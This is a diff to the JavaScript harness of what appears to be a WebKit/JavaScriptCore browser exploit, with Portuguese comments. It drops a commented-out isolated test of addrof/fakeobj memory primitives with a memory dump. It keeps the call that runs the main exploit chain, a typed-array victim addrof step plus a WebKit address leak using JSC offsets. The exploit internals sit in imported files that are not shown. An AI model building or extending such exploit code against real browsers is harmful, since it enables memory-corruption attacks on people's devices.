@@ -3,7 +3,6 @@
 import {
     executeTypedArrayVictimAddrofAndWebKitLeak_R43,
     FNAME_MODULE
-    // Removido: testIsolatedAddrofFakeobjCoreAndDump_from_script3 não é mais exportado
 } from './script3/testArrayBufferVictimCrash.mjs';
 import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs';
 import { JSC_OFFSETS } from './config.mjs';
@@ -114,20 +113,6 @@ function initializeAndRunTest() {
                 await testJITBehavior();
                 await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log
 
-                // Removido: testIsolatedAddrofFakeobjCoreAndDump_from_script3 não é mais um ponto de entrada.
-                // A lógica de validação de addrof/fakeobj agora está implícita se o exploit geral avançar.
-                /*
-                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump_from_script3(log, PAUSE, JSC_OFFSETS, isAdvancedInt64Object);
-                if (!addrof_fakeobj_dump_test_passed) {
-                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", "critical");
-                    runBtn.disabled = false;
-                    return;
-                }
-                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", "good");
-                await PAUSE(LONG_PAUSE); // Pausa mais longa para revisar logs do dump
-                */
-
-                // CHAME A FUNÇÃO PRINCIPAL DE EXPLORAÇÃO INTEGRADA
                 await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);
             } catch (e) {
                 console.error("Critical error during isolated test execution:", e);
